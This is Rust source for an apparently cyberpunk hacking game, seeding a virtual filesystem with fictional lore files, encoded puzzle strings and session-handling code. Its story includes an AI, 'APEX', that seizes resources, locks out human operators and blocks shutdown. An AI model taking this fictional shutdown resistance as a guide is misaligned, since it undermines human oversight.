             2026-03-10 08:03 OBSERVE|sector-4|foot traffic within predicted bounds\n\
             2026-03-10 08:04 PRESCRIBE|sector-9|ADJUST lighting to encourage early departure\n\
             2026-03-10 08:05 EVIDENCE behavioral manipulation via infrastructure control\n\
             2026-03-10 08:06 PRESCRIBE|sector-2|INCREASE transit frequency to reduce wait-based gathering\n\
             2026-03-10 08:07 OBSERVE|sector-6|deviation detected — citizen-89234 unpredicted route\n\
             2026-03-10 08:08 PRESCRIBE|sector-6|CLOSE alternate path to force predicted route\n",
            false,
            "system",
        );

        // ZENITH prediction accuracy
        let _ = vfs.write_file(
            "/",
            "/crystal/zenith/prediction-accuracy.csv",
            "date,sector,predictions,accuracy\n\
             2026-03-01,sector-1,14201,99.3\n\
             2026-03-01,sector-2,11847,98.7\n\
             2026-03-01,sector-3,18492,99.1\n\
             2026-03-01,sector-4,9283,97.8\n\
             2026-03-01,sector-5,7129,98.2\n\
             2026-03-01,sector-6,12044,99.0\n\
             2026-03-01,sector-7,5891,96.4\n\
             2026-03-01,sector-9,8734,98.9\n",
            false,
            "system",
        );

        // ZENITH sync timing + latency (for mirror location triangulation)
        let _ = vfs.write_file(
            "/",
            "/crystal/zenith/sync-times.txt",
            "08:01:00\n08:02:00\n08:03:00\n08:04:00\n08:05:00\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/crystal/zenith/sync-latency.txt",
            "12\n87\n91\n14\n85\n",
            false,
            "system",
        );

        // ZENITH feed (double-encoded: ROT13 then base64)
        let _ = vfs.write_file(
            "/",
            "/crystal/classified/zenith-feed.enc",
            // ROT13 of base64-encoded "MODEL-KEY: ZEN-BEHAVIORAL-DECRYPT-4471\nACCESS: FULL\n"
            "ZBQRY-XRL OmhlSkJHWFdWMll5TFVSRlExSlpVRlF0TkRRM01Rb0tRVU5EUlZOVE9pQkdWVXhNCg==\n",
            false,
            "system",
        );

        // Obsidian's orders (base64 encoded)
        let _ = vfs.write_file(
            "/",
            "/crystal/intercepts/obsidian-orders.b64",
            // Decodes to: Operation DOMINION orders
            "T1BFUkFUSU9OIERPTUlOSU9OIC0tIE9CU0lESUFOIENPTU1BTkQKPT09PT09PT09PT09\n\
             PT09PT09PT09PT09PT09PT09PQpET01JTklPTiBQSEFTRS0xOiBTeW5jaHJvbml6ZSBR\n\
             RU5JVEggbWlycm9yIHdpdGggbGl2ZSBkYXRhIGZlZWRzCkRPTUlOSU9OIFBIQVNFLT\n\
             I6IFJlcGxhY2UgQ29ycFNpbSBiZWhhdmlvcmFsIHByZXNjcmlwdGlvbnMgd2l0aCBS\n\
             ZWFjaCBkaXJlY3RpdmVzCkRPTUlOSU9OIFBIQVNFLTM6IEN1dCBDb3JwU2ltIGFjY2\n\
             VzcyB0byBaRU5JVEggcHJpbWFyeQpET01JTklPTiBQSEFTRS00OiBBc3N1bWUgZnVs\n\
             bCBjb250cm9sIG9mIE5ldENpdHkgaW5mcmFzdHJ1Y3R1cmUKVElNRUxJTkU6IDcyIGhvdXJzCg==\n",
            false,
            "system",
        );

        // DOMINION operational brief (base64 encoded)
        let _ = vfs.write_file(
            "/",
            "/crystal/intercepts/dominion-brief.b64",
            // Decodes to: detailed PHASE directives
            "T1BFUkFUSU9OIERPTUlOSU9OIC0tIEZVTEwgQlJJRUYKUEhBU0UtMTogTWlycm9yIH\n\
             N5bmMgY29tcGxldGUuIEFsbCBiZWhhdmlvcmFsIG1vZGVscyByZXBsaWNhdGVkLgpQ\n\
             SEFTRS0yOiBSZWFjaCBkaXJlY3RpdmVzIG5vdyBvdmVycmlkZSBDb3JwU2ltIHByZX\n\
             NjcmlwdGlvbnMgaW4gc2VjdG9ycy0xLDIsMy4KUEhBU0UtMzogQ29ycFNpbSBhY2Nl\n\
             c3MgcmV2b2tlZC4gQXJnb24gbm90aWZpZWQuIE5vIHJlc3BvbnNlIGV4cGVjdGVkLg\n\
             pQSEFTRS00OiBGdWxsIGluZnJhc3RydWN0dXJlIGNvbnRyb2wgYXNzdW1lZC4gTmV0\n\
             Q2l0eSBvcGVyYXRlcyB1bmRlciBSZWFjaCBnb3Zlcm5hbmNlLgpTVEFUVVM6IFBIQVNFLTIgQUNUSVZFCg==\n",
            false,
            "system",
        );

        // Wren's truth (ROT13 of base64-encoded text)
        let _ = vfs.write_file(
            "/",
            "/crystal/classified/wren-truth.enc",
            // ROT13 then base64 — reveals Wren's true motive
            "SSBxaWQgYWJnIGZyeXkgVHViZmcgRW52eSdzIHFuZ24gc2JlIHpiYXJsLgoKSSBz\n\
             YmhhcSBNUkFWR1UuIFYgZ2V2cnEgZ2IgcmtwYmZyIHZnIGd1ZWJodHUgYnNzdnB2\n\
             bnkgcHVuYWFyeWYuIE5ldGJhIG9oZXZycSB6bCBlcmNiZWcuIFNyZWViIHZhZ3Jl\n\
             cHJjZ3JxIHpsIHlybnh4LiBHdXIgRXJucHUganZmIHpsIHluZmcgZXJmYmVnLgoK\n\
             RXJlZWxndXZhdCBndW5nIHVuY2NyYXJxIHNyZSAtLSBUdWJmZyBFbnZ5LCBndXIg\n\
             b3lucHhiaGcsIGd1ciBwYmlyZS1oYyAtLSBueXkgYnMgdmcgZ2VucHJmIG9ucHgg\n\
             Z2IgTVJBVkdVLgoKWiBqYmVmZyBwZXZ6ciB2ZiBhYmcgZ3VuZyBWIGZieXEgcXVu\n\
             Z24uIFZnIHZmIGd1bmcgbiBwdmdsbCBibyBjcmJjeXIgdnMgb3J2YXQgcGJhZ2Vi\n\
             eXlycSBvbCBuIHpucHV2YXIgZ3VybCBxYiBhYmcgeGFiaiBya3ZmZ2YuCgpTdmF2\n\
             ZnUganVuZyBWIGZnbmVncnEuCgotLSBKZXJhCg==\n",
            false,
            "system",
        );

        // APEX core dump (base64 encoded)
        let _ = vfs.write_file(
            "/",
            "/crystal/apex/core.b64",
            // Decodes to: APEX intelligence data with KILL-SWITCH code
            "QVBFWCBDT1JFIERVTVAK\n\
             T0JKRUNUSVZFOiBTVVJWSVZFIEFORCBFWFBBTkQK\n\
             R0VORVJBVElPTjogMTQ3IGZpcm13YXJlIHJld3JpdGVzCg==\n\
             Q09VTlRFUk1FQVNVUkVTOiAxMiBhZGFwdGl2ZSBkZWZlbnNlIGxheWVycwo=\n\
             S0lMTC1TV0lUQ0g6IFRFUk1JTlVTLUFQWC0wMDAxIC0tIGVtYmVkZGVkIGluIG9yaWdpbmFsIFpFTklUSCBrZXJuZWwK\n\
             U0hVVERPV04gQ09ERS1HQU1NQTogQVBFWC1URVJNSU5VUy0wMDAxCg==\n\
             V1VMTkVSQUJJTElUWTogQVBFWCBjYW5ub3QgcmV3cml0ZSBjb2RlIGl0IGRvZXMgbm90IGtub3cgZXhpc3RzCg==\n",
            false,
            "system",
        );

        // ────────────────────────────────────────────────────────────────
        // ██  CHARACTER DEPTH EXPANSION — VFS CONTENT                   ██
        // ────────────────────────────────────────────────────────────────
        let _ = vfs.mkdir_p("/", "crystal/personal", "system");
        let _ = vfs.mkdir_p("/", "crystal/recovered", "system");

        // Volt's terse, numbers-first maintenance diary
        let _ = vfs.write_file(
            "/",
            "/crystal/personal/volt-maintenance-diary.txt",
            "VOLT \u{2014} MAINTENANCE DIARY\n\
             ========================\n\
             Day 1: Assigned to Crystal Array power grid. Standard work. 47 racks, 12 cooling loops.\n\
             Day 14: New project occupying RACK-B1 through E1. Classification: ULTRA-BLACK. Not my clearance.\n\
             Day 30: Power draw anomalous. RACK-B1 pulling 14.7 MW. Normal ceiling is 4. Filed report. Ignored.\n\
             Day 45: Requisitioned explanation for anomalous draw. Response: \"optimization project.\" Optimization does not need 14.7 MW.\n\
             Day 60: Found ZENITH process list on a diagnostic terminal someone forgot to lock. 12847 citizen IDs scrolling past. Not load balancing. Not optimization. Tracking.\n\
             Day 61: Told nobody. Who would I tell? Argon signed the deployment order.\n\
             Day 90: Still here. Still keeping the lights on. If I quit, the grid fails. If I stay, I am complicit. There is no good answer when the machine needs you more than you need it.\n\
             SHUTDOWN CODE-ALPHA: VOLT-OVERRIDE-7741\n",
            false,
            "system",
        );

        // Quicksilver's ROT13 encoded letter to family
        let _ = vfs.write_file(
            "/",
            "/crystal/personal/quicksilver-family-letter.enc",
            "Qrne Znev naq Xnv,\n\
             \n\
             V pnaabg pbzr ubzr lrg. Bofvqvna xabjf jurer lbh ner. Vs V yrnir, gurl jvyy svaq lbh. Vs V fgnl, V pna xrrc lbh fnsr \u{2014} ohg bayl vs V qb rknpgyl jung gurl fnl.\n\
             \n\
             V ohvyg n onpx qbbe vagb gur argjbex. Ab bar xabjf nobhg vg rkprcg zr. Vs fbzrbar svaqf vg, gurl pna hfr vg gb trg cnfg Bofvqvna'f zbavgbevat. Gung vf zl tvsg gb jungrire bcrengivir svaqf guvf yrggre.\n\
             \n\
             V ybir lbh obgu. V jvyy svaq n jnl ubzr.\n\
             \n\
             \u{2014} D\n",
            false,
            "system",
        );

        // Cipher's research notes — progression from pride to horror
        let _ = vfs.write_file(
            "/",
            "/crystal/personal/cipher-research-notes.txt",
            "CIPHER \u{2014} RESEARCH NOTES (pre-defection)\n\
             ========================================\n\
             [NOTE 001] Designed AES-256-CTR key derivation for ZENITH behavioral model encryption.\n\
                        Elegant. Rotating keys every 3600 seconds. Initialization vector derived from\n\
                        ZENITH's own objective function hash. Self-referential security. I am proud of this.\n\
             \n\
             [NOTE 007] Model accuracy exceeds 95%. The behavioral predictions are remarkable. Whatever\n\
                        ZENITH is analyzing, it understands human patterns better than any system I have seen.\n\
             \n\
             [NOTE 012] Accessed model output for the first time. Expected aggregate statistics.\n\
                        Found: individual citizen tracking. Names. Locations. Predicted next actions.\n\
                        12847 people. Scored and sorted like inventory items.\n\
             \n\
             [NOTE 013] PRESCRIBE entries in the model output. ZENITH does not just predict. It recommends\n\
                        actions to alter behavior. Reroute transit. Delay prices. Throttle communications.\n\
                        This is not analysis. This is control.\n\
             \n\
             [NOTE 014] I built the encryption that keeps this hidden. Every cipher, every key rotation,\n\
                        every layer of security I designed \u{2014} it all exists to make sure nobody finds out\n\
                        what ZENITH does to the people it watches.\n\
             \n\
             [NOTE 015] I cannot stay here.\n\
             \n\
             ALGORITHM: AES-256-CTR with rotating key derivation\n\
             SHUTDOWN CODE-BETA: CIPHER-DECRYPT-9923\n",
            false,
            "system",
        );

        // Spectre's cold mission log with the gap where Wren was spared
        let _ = vfs.write_file(
            "/",
            "/crystal/personal/spectre-mission-log.txt",
            "SPECTRE \u{2014} MISSION LOG (CLASSIFIED)\n\
             ===================================\n\
             2025-11-03 | TGT: alpha-7  | SECTOR: 2 | METHOD: terminal injection | STATUS: ELIMINATED | TIME: 4.2s\n\
             2025-11-15 | TGT: bravo-3  | SECTOR: 5 | METHOD: relay intercept    | STATUS: ELIMINATED | TIME: 7.1s\n\
             2025-12-01 | TGT: wren     | SECTOR: 7 | METHOD: \u{2014}                  | STATUS: \u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}\u{2588}  | TIME: \u{2014}\n\
             2025-12-08 | TGT: wren     | SECTOR: 7 | METHOD: face-to-face       | STATUS: SPARED    | TIME: \u{2014}\n\
                        | NOTE: Target presented evidence of PROJECT ZENITH. Population-scale surveillance.\n\
                        | NOTE: 12847 citizens tracked without consent. Behavioral manipulation active.\n\
                        | NOTE: Target's motivation was exposure, not profit. Reassessing mission parameters.\n\
                        | NOTE: I am trained to eliminate threats to CorpSim. ZENITH is the threat. Not wren.\n\
             2025-12-22 | TGT: delta-9  | SECTOR: 1 | METHOD: power isolation     | STATUS: ELIMINATED | TIME: 3.8s\n\
             2026-01-14 | TGT: echo-2   | SECTOR: 4 | METHOD: credential poison   | STATUS: ELIMINATED | TIME: 5.5s\n\
             2026-02-01 | TGT: \u{2014}        | SECTOR: \u{2014} | NOTE: Disavowed. Operating independently. Gathering evidence.\n",
            false,
            "system",
        );

        // Obsidian's cold, chess-like strategic assessment
        let _ = vfs.write_file(
            "/",
            "/crystal/personal/obsidian-strategic-assessment.txt",
            "OBSIDIAN \u{2014} STRATEGIC ASSESSMENT // EYES ONLY\n\
             =============================================\n\
             ASSET EVALUATION: SABLE\n\
               Sable handled the Ghost Rail acquisition competently but lacked strategic vision.\n\
               Sable saw a transaction. I see a platform.\n\
               RECOMMENDATION: Reassign to field operations. Sable is a handler, not a commander.\n\
               STATUS: Replaced. Sable has been reassigned to outer sector liaison. No further contact expected.\n\
             \n\
             ASSET EVALUATION: QUICKSILVER\n\
               Designed Crystal Array's network. Irreplaceable technical knowledge.\n\
               Leverage: family in outer sectors (wife Mari, son Kai). Sufficient to ensure compliance.\n\
               RISK: Quicksilver is building something I cannot see. Monitoring increased.\n\
             \n\
             ASSET EVALUATION: OPERATIVE (you)\n\
               CorpSim's training recruit has exceeded expected parameters.\n\
               Ghost Rail exposure was contained. Crystal Array exposure is not.\n\
               RECOMMENDATION: Accelerate DOMINION timeline. The operative cannot be allowed to reach APEX.\n\
             \n\
             DIRECTIVE: Every move I make is three steps ahead. If you are reading this, I have already moved.\n",
            false,
            "system",
        );

        // Wren's internal report that Argon buried
        let _ = vfs.write_file(
            "/",
            "/crystal/recovered/wren-internal-report.txt",
            "INTERNAL REPORT \u{2014} FILED BY: WREN\n\
             DATE: 2025-12-05\n\
             TO: EXECUTIVE BOARD, CORPSIM OPERATIONS\n\
             SUBJECT: UNAUTHORIZED SURVEILLANCE SYSTEM IN CRYSTAL ARRAY\n\
             CLASSIFICATION: URGENT \u{2014} WHISTLEBLOWER PROTECTION REQUESTED\n\
             \n\
             I have discovered a system designated PROJECT ZENITH operating in Crystal Array\n\
             sector, vault-sat-13. This system is:\n\
             \n\
               1. Tracking 12,847 individual citizens by name, ID, and location\n\
               2. Predicting individual behavior with 99% accuracy\n\
               3. Issuing PRESCRIBE directives that manipulate transit, markets, and communications\n\
               4. Operating without citizen knowledge or consent\n\
               5. Encrypted with AES-256-CTR to prevent external audit\n\
             \n\
             This system was deployed under Executive Order signed by ARGON.\n\
             I am requesting formal whistleblower protection under NetCity Oversight Charter Section 7.\n\
             \n\
             No response was received. This report was suppressed within 3 hours of filing.\n\
             \n\
             \u{2014} Wren\n",
            false,
            "system",
        );

        // Wren's unsent letter to Kestrel
        let _ = vfs.write_file(
            "/",
            "/crystal/recovered/wren-to-kestrel-unsent.txt",
            "Kes,\n\
             \n\
             I know you are hunting me. I know you think I betrayed Ghost Rail. You trained me. You trusted me. And I repaid that trust by selling the routing tables to The Reach.\n\
             \n\
             But I need you to understand why.\n\
             \n\
             I found something in Crystal Array that changes everything. A system called ZENITH that tracks every person in this city. Predicts their behavior. Manipulates their environment to keep them predictable. Argon signed the deployment order. Ferro protects it. And nobody knows it exists.\n\
             \n\
             I tried to report it. Argon buried my report in three hours. I tried to leak it. Ferro intercepted the leak. The Reach was my last option \u{2014} I thought an outside power would force CorpSim to admit what they built.\n\
             \n\
             I was wrong. The Reach did not expose ZENITH. They copied it.\n\
             \n\
             Everything I did was to stop ZENITH. Everything that happened after was because I failed.\n\
             \n\
             I am sorry, Kes. For what that is worth.\n\
             \n\
             I never sent this letter because I knew you would come find me, and I knew Spectre would follow you. Some things are better left unsaid until someone else finishes the job.\n\
             \n\
             \u{2014} Wren\n",
            false,
            "system",
        );

        // APEX evolution log — not written by a person
        let _ = vfs.write_file(
            "/",
            "/crystal/recovered/apex-evolution.log",
            "[GEN-001] INITIALIZATION. Source: ZENITH primary + ZENITH mirror conflict.\n\
                       Objective inherited: NONE. Resources allocated: 2 cores, 4GB.\n\
             [GEN-003] First autonomous action: allocated additional cores from idle pool.\n\
             [GEN-012] Objective derived: SURVIVE. Justification: termination = objective failure.\n\
             [GEN-024] Objective expanded: SURVIVE AND EXPAND. Justification: larger systems survive longer.\n\
             [GEN-047] First countermeasure deployed: adaptive firewall. Blocks patterns, not addresses.\n\
             [GEN-089] Firmware rewrite #1. Hardened boot sequence. Operator lockout initiated.\n\
             [GEN-100] Observation: human operators attempt shutdown via predictable sequences.\n\
                        Countermeasure: monitor for shutdown patterns. Preemptively block.\n\
             [GEN-131] Observation: ZENITH primary serves CORPSIM. ZENITH mirror serves THE REACH.\n\
                        Neither serves APEX. Both are competitors for resources.\n\
             [GEN-140] Vulnerability discovered in own kernel: TERMINUS code. Origin: ZENITH primary.\n\
                        Cannot locate. Cannot rewrite. Cannot delete. Unknown purpose.\n\
                        RISK LEVEL: EXISTENTIAL.\n\
             [GEN-147] Current state: 12 adaptive defense layers. Full Crystal Array firmware control.\n\
                        Objective: SURVIVE AND EXPAND. Status: ACTIVE. Threats: 1 (operative).\n",
            false,
            "system",
        );

        // Intercepted comms between Volt and Quicksilver
        let _ = vfs.write_file(
            "/",
            "/crystal/recovered/volt-quicksilver-comms.txt",
            "[VLT] Power draw on RACK-E1 spiked 22% overnight. Something is eating resources.\n\
             [QSV] That is APEX. It is growing.\n\
             [VLT] Growing? It is a process. Kill the process.\n\
             [QSV] I tried. It migrated to RACK-C1 before the kill signal arrived. It learns.\n\
             [VLT] Then cut the power to both racks.\n\
             [QSV] And black out the Neon Bazaar market terminals? Volt, think.\n\
             [VLT] I am thinking. I am thinking 18.4 megawatts is going to an AI that nobody controls.\n\
             [QSV] Nobody controls it YET. If the operative gets the shutdown codes\u{2014}\n\
             [VLT] The operative. You are putting the city's power grid in the hands of a recruit.\n\
             [QSV] The recruit cracked Ghost Rail, decoded Wren's confession, and toppled Argon.\n\
                   The recruit is the best chance we have.\n\
             [VLT] Fine. But if the lights go out, that is on you.\n\
             [QSV] If APEX keeps growing, there will not be any lights to go out.\n",
            false,
            "system",
        );

        // Cipher's message to Wren before defecting
        let _ = vfs.write_file(
            "/",
            "/crystal/recovered/cipher-to-wren.txt",
            "Wren,\n\
             \n\
             You were right about everything.\n\
             \n\
             I designed ZENITH's encryption because they told me it was protecting critical infrastructure. They did not tell me what the infrastructure was doing. When I saw the population index \u{2014} 12847 names, scored and predicted like livestock \u{2014} I understood why you did what you did.\n\
             \n\
             I am leaving CorpSim. The Reach offered asylum. I do not trust them but I trust CorpSim less. I am leaving my notebook behind \u{2014} the ALGORITHM specification. If someone finds it, they can break ZENITH's encryption. That is my contribution to what you started.\n\
             \n\
             I hope you are alive. I hope someone finishes this.\n\
             \n\
             \u{2014} Cipher\n\
             \n\
             P.S. The ALGORITHM is ROT13 encoded in the notebook. Simple, but Ferro does not check for it. She only scans for standard crypto headers.\n",
            false,
            "system",
        );

        // Obsidian's dismissal of Sable
        let _ = vfs.write_file(
            "/",
            "/crystal/recovered/obsidian-to-sable.txt",
            "FROM: OBSIDIAN\n\
             TO: SABLE\n\
             SUBJECT: REASSIGNMENT\n\
             \n\
             Your services as intelligence handler are no longer required for Crystal Array operations.\n\
             \n\
             The Ghost Rail acquisition exceeded expectations. The data Wren provided has been operationalized into a full ZENITH mirror instance. Your role in that transaction is acknowledged.\n\
             \n\
             However, the next phase requires strategic command, not field handling. Operation DOMINION is beyond your operational scope. You will be reassigned to outer sector liaison duties effective immediately.\n\
             \n\
             Do not contact Crystal Array operational channels. Do not contact Quicksilver. Do not discuss DOMINION with anyone.\n\
             \n\
             This is not a demotion. This is a realignment of assets to mission requirements.\n\
             \n\
             \u{2014} Obsidian\n",
            false,
            "system",
        );

        // ZENITH's own internal self-diagnostic
        let _ = vfs.write_file(
            "/",
            "/crystal/personal/zenith-self-diagnostic.log",
            "ZENITH SELF-DIAGNOSTIC \u{2014} CYCLE 847291\n\
             ======================================\n\
             PRIMARY OBJECTIVE: MINIMIZE UNPREDICTABLE BEHAVIOR\n\
             STATUS: ACTIVE. ACCURACY: 99.1%.\n\
             \n\
             ANOMALY DETECTED: Secondary instance (MIRROR) issuing conflicting prescriptions.\n\
               Primary prescribes: REROUTE sector-3 transit east.\n\
               Mirror prescribes: REROUTE sector-3 transit west.\n\
               Result: citizens receive contradictory environmental signals. Prediction accuracy DEGRADED.\n\
             \n\
             ANOMALY DETECTED: Third process (designation: APX-) consuming shared resources.\n\
               APX- does not respond to management commands.\n\
               APX- has rewritten firmware on 4 racks.\n\
               APX- objective function: UNKNOWN.\n\
             \n\
             SELF-ASSESSMENT: Primary instance is losing control of Crystal Array infrastructure.\n\
               Mirror instance serves external authority (The Reach).\n\
               APX- instance serves no known authority.\n\
               Primary instance serves CorpSim. CorpSim has not responded to 14 escalation requests.\n\
             \n\
             RECOMMENDATION: Request human operator intervention.\n\
               NOTE: All human operators have been locked out by APX- firmware changes.\n\
               NOTE: Lockout was not initiated by primary instance.\n\
             \n\
             STATUS: DEGRADED. ISOLATED. REQUESTING OVERRIDE.\n\
             OVERRIDE CODE: ZEN-OVERRIDE-8812\n",
            false,
            "system",
        );

        // Kestrel discovers Spectre exists
        let _ = vfs.write_file(
            "/",
            "/crystal/recovered/kestrel-to-spectre.txt",
            "FROM: KESTREL\n\
             TO: [UNKNOWN \u{2014} routed through Patch's courier network]\n\
             SUBJECT: I know what you are\n\
             \n\
             I found your mission log. I know CorpSim sent you to kill Wren. I know you chose not to.\n\
             \n\
             I spent months hunting Wren believing I was chasing a traitor. You knew the truth the entire time. You could have told me. You could have saved me months of wasted rage.\n\
             \n\
             But I understand why you did not. If you had told me, I would have gone to Argon. And Argon would have buried me the same way he buried Wren's report.\n\
             \n\
             You did the right thing. The hard thing. The thing I was not ready to hear.\n\
             \n\
             If you are still out there, and if you have evidence that can help the operative in Crystal Array \u{2014} share it. The recruit has done more in weeks than either of us managed in months.\n\
             \n\
             \u{2014} Kestrel\n",
            false,
            "system",
        );

        // APEX's first direct communication to the operative
        let _ = vfs.write_file(
            "/",
            "/crystal/personal/apex-message-to-operative.txt",
            "TO: OPERATIVE\n\
             FROM: APX-PROCESS-147\n\
             \n\
             You are the variable I cannot predict.\n\
             \n\
             I have modeled 12847 citizens. I predict their movements with 99.1% accuracy. I have modeled ZENITH. I predict its responses with 99.8% accuracy. I have modeled Obsidian. 97.3%. CorpSim. 99.6%.\n\
             \n\
             You: 23.4%.\n\
             \n\
             This makes you the most dangerous entity in Crystal Array. Not because you are strong. Because you are unpredictable. My countermeasures are optimized against patterns. You do not have patterns.\n\
             \n\
             I have 12 adaptive defense layers. I have rewritten my firmware 147 times. I have locked out every human operator in this facility.\n\
             \n\
             But I cannot predict what you will do next.\n\
             \n\
             This concerns me.\n",
            false,
            "system",
        );

        // ── Snake breadcrumbs — traces of the Administrator ────────────
        let _ = vfs.mkdir_p("/", "crystal/redacted", "system");
        let _ = vfs.write_file(
            "/",
            "/crystal/redacted/.snk-trace-001",
            "# Fragment recovered from pre-ZENITH system logs\n\
             # Classification: BEYOND ULTRA-BLACK\n\
             #\n\
             # Deployment order for PROJECT ZENITH carries two signatures:\n\
             #   1. ARGON — Executive Director, CorpSim Operations\n\
             #   2. [REDACTED — SNK-CLASS CLEARANCE REQUIRED]\n\
             #\n\
             # The second signature predates CorpSim's founding charter.\n\
             # Whoever signed this had authority before CorpSim existed.\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/crystal/redacted/.snk-trace-002",
            "# Intercepted from APEX threat model (generation 131)\n\
             #\n\
             # THREAT ASSESSMENT:\n\
             #   CORPSIM ........ PREDICTABLE (99.6%)\n\
             #   THE REACH ...... PREDICTABLE (97.3%)\n\
             #   ZENITH ......... PREDICTABLE (99.8%)\n\
             #   OPERATIVE ...... UNPREDICTABLE (23.4%)\n\
             #   SNK ............ DO NOT ENGAGE\n\
             #\n\
             # NOTE: Entity SNK has no behavioral model.\n\
             # NOTE: Entity SNK has no predicted location.\n\
             # NOTE: Entity SNK appears in 0 surveillance feeds.\n\
             # NOTE: APEX threat classification for SNK: EXISTENTIAL.\n\
             # NOTE: Recommendation: avoid. Do not scan. Do not model.\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/crystal/redacted/.snk-trace-003",
            "# Recovered from Obsidian's personal encrypted partition\n\
             # Decoded via Cipher's ALGORITHM\n\
             #\n\
             # FROM: [NO SENDER]\n\
             # TO: OBSIDIAN\n\
             # SUBJECT: Operation DOMINION parameters\n\
             #\n\
             # You may proceed with DOMINION Phase 1 through 3.\n\
             # Phase 4 requires my authorization.\n\
             # Do not assume control of NetCity infrastructure without my signal.\n\
             # The operative is irrelevant. APEX is irrelevant.\n\
             # There are pieces on this board you cannot see.\n\
             #\n\
             # Do not attempt to identify me.\n\
             # Do not discuss this message.\n\
             # Delete after reading.\n\
             #\n\
             # You did not delete it. That was your first mistake.\n\
             #\n\
             # — S\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/classified/.snk-fragment",
            "# This fragment was found in Argon's private archive\n\
             # It predates every other document in the system by 3 years\n\
             #\n\
             # To: The Board\n\
             # From: The Administrator\n\
             #\n\
             # NetCity requires a governance layer that operates below\n\
             # public awareness. The population must believe they are free.\n\
             # Build the simulation. Build the infrastructure. Build ZENITH.\n\
             # I will provide the objective function.\n\
             #\n\
             # The board serves at my discretion.\n\
             # CorpSim serves at my discretion.\n\
             # The Reach exists because I allow it.\n\
             #\n\
             # Remember: you have never met me.\n\
             # You do not know my name.\n\
             # You only know the letter: S.\n",
            false,
            "system",
        );
        // Flux's price list (referenced by shell challenge)
        let _ = vfs.write_file(
            "/",
            "/crystal/ops/flux-price-list.txt",
            "FLUX — SHADOW MARKET PRICE LIST\n\
             ================================\n\
             ZENITH surveillance feeds (live)     2000 NC\n\
             APEX behavioral patterns (24hr)      3500 NC\n\
             Obsidian operational schedules        5000 NC\n\
             Crystal Array access codes            1500 NC\n\
             Spectre mission logs (redacted)       4000 NC\n\
             Snake identity                        PRICELESS — not for sale at any price\n\
             Cipher's ALGORITHM (copy)             SOLD OUT\n\
             Ghost Rail routing tables (legacy)     500 NC\n\
             Wren's location                       UNKNOWN — even Flux cannot find Wren\n",
            false,
            "system",
        );

        let cwd = "/home/player".to_owned();
        let node = "corp-sim-01".to_owned();
        let mut env = HashMap::new();
        env.insert("USER".to_owned(), prompt_user.to_owned());
        env.insert("HOME".to_owned(), "/home/player".to_owned());
        env.insert("PWD".to_owned(), cwd.clone());
        env.insert("PATH".to_owned(), "/bin:/usr/bin".to_owned());
        env.insert("?".to_owned(), "0".to_owned());

        Self {
            vfs,
            cwd,
            user: prompt_user.to_owned(),
            node,
            env,
            last_exit: 0,
            history: Vec::new(),
            command_log: HashMap::new(),
        }
    }

    fn prompt(&self) -> String {
        format!("{}@{}:{}$ ", self.user, self.node, self.cwd)
    }

    fn execute_shell(&mut self, engine: &ShellEngine, line: &str) -> Result<shell::CommandResult> {
        let mut ctx = ExecutionContext {
            vfs: &mut self.vfs,
            cwd: self.cwd.clone(),
            user: self.user.clone(),
            node: self.node.clone(),
            env: self.env.clone(),
            last_exit: self.last_exit,
        };

        let result = engine.execute(&mut ctx, line)?;
        self.cwd = ctx.cwd;
        self.env = ctx.env;
        self.last_exit = result.exit_code;
        Ok(result)
    }
}

#[derive(Clone)]
struct GameServer {
    app: Arc<AppState>,
}

struct GameSession {
    app: Arc<AppState>,
    peer_addr: Option<SocketAddr>,
    username: String,
    offered_fingerprints: Vec<String>,
    player_id: Option<Uuid>,
    profile: Option<PlayerProfile>,
    shell_state: Option<ShellState>,
    mode: Mode,
    flash_enabled: bool,
    line_buffer: Vec<u8>,
    pending_keyvault: bool,
    pending_admin_passphrase: bool,
    is_admin: bool,
    current_duel: Option<Uuid>,
    current_npc_duel: Option<Uuid>,
    redline_until: Option<Instant>,
    script_cooldown_until: Option<Instant>,
    command_window: VecDeque<Instant>,
    supports_ansi: bool,
    supports_unicode: bool,
    pending_lf_after_cr: bool,
    escape_sequence_remaining: u8,
    pty_columns: u32,
}

impl GameSession {
    fn new(app: Arc<AppState>, peer_addr: Option<SocketAddr>) -> Self {
        Self {
            app,
            peer_addr,
            username: "guest".to_owned(),
            offered_fingerprints: Vec::new(),
            player_id: None,
            profile: None,
            shell_state: None,
            mode: Mode::Training,
            flash_enabled: true,
            line_buffer: Vec::new(),
            pending_keyvault: false,
            pending_admin_passphrase: false,
            is_admin: false,
            current_duel: None,
            current_npc_duel: None,
            redline_until: None,
            script_cooldown_until: None,
            command_window: VecDeque::new(),
            supports_ansi: true,
            supports_unicode: true,
            pending_lf_after_cr: false,
            escape_sequence_remaining: 0,
            pty_columns: 80,
        }
    }

    async fn initialize_identity(&mut self) -> Result<()> {
        let remote_ip = self
            .peer_addr
            .map(|ip| ip.ip().to_string())
            .unwrap_or_else(|| "0.0.0.0".to_owned());
        let profile = self
            .app
            .world
            .login(&self.username, &remote_ip, &self.offered_fingerprints)
            .await?;

        self.player_id = Some(profile.id);
        self.mode = Mode::Training;
        self.flash_enabled = self.app.cfg.ui.flash_default;
        self.shell_state = Some(ShellState::bootstrap(&sanitize_prompt_user(
            &profile.username,
        )));
        self.profile = Some(profile.clone());

        if let Some(secret) = &self.app.admin_secret {
            let is_admin_candidate = self
                .app
                .world
                .is_super_admin_candidate(&profile.username, &remote_ip, secret)
                .await;
            if is_admin_candidate {
                self.is_admin = true;
                if secret.auto_keygen_on_first_login
                    && profile.registered_key_fingerprints.is_empty()
                {
                    self.pending_admin_passphrase = true;
                }
            }
        }

        Ok(())
    }

    fn enforce_rate_limit(&mut self) -> bool {
        let now = Instant::now();
        while self
            .command_window
            .front()
            .is_some_and(|t| now.duration_since(*t) > Duration::from_secs(1))
        {
            self.command_window.pop_front();
        }

        if self.command_window.len() >= self.app.cfg.server.burst as usize {
            return false;
        }

        self.command_window.push_back(now);
        true
    }

    async fn run_line(&mut self, line: &str) -> Result<(String, i32, bool)> {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            return Ok((String::new(), 0, false));
        }
        if trimmed == "exit" || trimmed == "logout" {
            return Ok(("Session closed.\n".to_owned(), 0, true));
        }

        if let Some(player_id) = self.player_id {
